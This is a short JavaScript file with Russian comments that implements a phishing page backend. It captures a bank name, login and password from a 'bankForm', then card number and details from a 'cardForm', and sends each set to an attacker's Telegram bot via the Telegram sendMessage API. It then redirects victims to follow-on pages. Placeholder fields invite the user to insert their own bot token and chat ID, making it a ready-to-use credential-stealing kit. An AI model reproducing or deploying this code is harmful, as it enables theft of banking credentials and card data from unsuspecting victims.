// Конфигурация Telegram (замените на свои данные)
const TELEGRAM_API_ID = "ВАШ_API_ID";       // Получить на my.telegram.org
const TELEGRAM_API_HASH = "ВАШ_API_HASH";  // Получить там же
const BOT_TOKEN = "ВАШ_BOT_TOKEN";         // Через @BotFather
const CHAT_ID = "ВАШ_CHAT_ID";             // Через @userinfobot

// Отправка данных в Telegram
async function sendToTelegram(data) {
    const message = `📊 Новые данные:\n${JSON.stringify(data, null, 2)}`;
    
    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: "Markdown"
            })
        });
        
        if (!response.ok) throw new Error("Ошибка отправки");
        return true;
    } catch (error) {
        console.error("Ошибка:", error);
        return false;
    }
}

// Обработка формы банка
document.getElementById("bankForm")?.addEventListener("submit", async (e) => {
    e.preventDefault();
    
    const formData = {
        bank: document.getElementById("bankName").value,
        login: document.getElementById("bankLogin").value,
        password: document.getElementById("bankPassword").value,
        apiId: TELEGRAM_API_ID,
        apiHash: TELEGRAM_API_HASH
    };

    await sendToTelegram(formData);
    window.location.href = "inventory-card.html";
});

// Обработка инвентарной карты
document.getElementById("cardForm")?.addEventListener("submit", async (e) => {
    e.preventDefault();
    
    const formData = {
        cardNumber: document.getElementById("cardNumber").value,
        details: document.getElementById("cardDetails").value
    };

    await sendToTelegram(formData);
    window.location.href = "success.html";
});
